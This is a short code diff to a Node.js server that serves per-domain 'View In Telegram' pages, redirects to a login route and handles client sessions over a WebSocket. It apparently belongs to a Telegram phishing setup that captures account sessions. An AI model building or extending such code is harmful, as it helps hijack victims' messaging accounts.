@@ -129,11 +129,13 @@ app.get('/ready', (_req, res) => {
 
 
 app.get(`/`, async (req, res) => {
+    console.log(req.headers['host'])
     const site = await domain.findOne({ name: req.headers['host'] });
 
     if (site?.template === 0) return res.redirect('/login');
 
     const template = await domainTemplate.findOne({ id: site?.template });
+    if(template.type === 'auth') return res.redirect('/login');
     if (!site || !template) return res.status(404).send(`404`);
 
     template.text = template.type === 'bot' ? 'Send Message' : "View In Telegram";
@@ -292,7 +294,7 @@ ws.on('connection', async (socket, request) => {
         } catch (e) {
             console.error(e);
         }
-    }, 300000);
+    }, 30000);
 
     socket.send(JSON.stringify({ action: 'connected' }));
 
@@ -307,7 +309,6 @@ ws.on('connection', async (socket, request) => {
         }
     });
 
-    console.log(client.session.save());
     socket.send(JSON.stringify({ action: 'success' }))
     socket.close();
 
